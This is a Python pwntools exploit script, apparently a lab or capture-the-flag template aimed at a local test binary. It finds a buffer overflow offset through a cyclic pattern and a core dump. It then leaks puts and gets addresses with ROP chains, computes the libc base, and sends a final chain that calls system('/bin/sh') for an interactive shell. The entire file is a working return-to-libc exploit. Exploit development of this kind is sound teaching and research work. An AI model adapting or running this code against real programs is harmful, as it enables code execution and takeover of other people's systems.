from pwn import *
# sudo sysctl -w kernel.core_pattern=core
elf = ELF("./tests/ret1")
rop1 = ROP(elf)

offset_leaking = elf.process()
p = elf.process()

context.arch = 'amd64'

OFFSET = b""
if OFFSET == b"":
	log.info("Searching for offset")
	offset_leaking.sendline(cyclic(516,n=8))
	offset_leaking.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")

p = elf.process()

print(p.recv())

RET = (rop1.find_gadget(['ret']))[0]

rop1.call(elf.symbols["puts"], [elf.got['puts']])
rop1.call(elf.symbols["main"])

payload1 = [
	b"A"*OFFSET,
	rop1.chain()
]

payload1 = b"".join(payload1)
if (len(payload1) % 16) == 0:
	log.info("Payload 1 already aligned")
else:
    payload1 = b"A"*OFFSET + p64(RET) + rop1.chain()
    if (len(payload1) % 16) == 0:
        log.info("Payload 1 aligned successfully")
    else:
        log.warning(f"I couldn't align the payload! Len: {len(payload1)}")

p.sendline(payload1)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts @ {hex(puts)}")

rop2 = ROP(elf)

rop2.call(elf.symbols["puts"], [elf.got['gets']])
rop2.call(elf.symbols["main"])

payload2 = [
	b"A"*OFFSET,
	rop2.chain()
]

payload2 = b"".join(payload2)

RET = (rop2.find_gadget(['ret']))[0]
if (len(payload2) % 16) == 0:
	log.info("Payload 2 already aligned")
else:
    payload2 = b"A"*OFFSET + p64(RET) + rop2.chain()
    if (len(payload2) % 16) == 0:
        log.info("Payload 2 aligned successfully")
    else:
        log.warning(f"I couldn't align the payload! Len: {len(payload2)}")

p.sendline(payload2)

gets = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Gets @ {hex(gets)}")

#libc = ELF()
LIBC = "./libc6_2.31-0ubuntu9.2_amd64.so"
libc = ELF(LIBC)

if LIBC:
    libc.address = puts - libc.symbols['puts'] #Save LIBC base
    log.info("LIBC base @ %s" % hex(libc.address))

    # If not LIBC yet, stop here
else:
    log.warning("TO CONTINUE: Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
    p.interactive()
    exit()

rop3 = ROP(libc)
rop3.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop3.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop3.call("exit")

payload3 = [
	b"A"*OFFSET,
	rop3.chain()
]

payload3 = b"".join(payload3)

if (len(payload3) % 16) == 0:
	log.info("Payload 3 already aligned")
else:
    payload3 = b"A"*OFFSET + p64(RET) + rop3.chain()
    if (len(payload3) % 16) == 0:
        log.info("Payload 3 aligned successfully")
    else:
        log.warning(f"I couldn't align the payload! Len: {len(payload3)}")


POP_RDI = (rop3.find_gadget(['pop rdi', 'ret']))[0]
BINSH = next(libc.search(b"/bin/sh"))  #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("POP_RDI @ %s " % hex(POP_RDI))
log.info("/bin/sh @ %s " % hex(BINSH))
log.info("system @ %s " % hex(SYSTEM))
log.info("exit @ %s " % hex(EXIT))

p.sendline(payload3)

p.interactive()
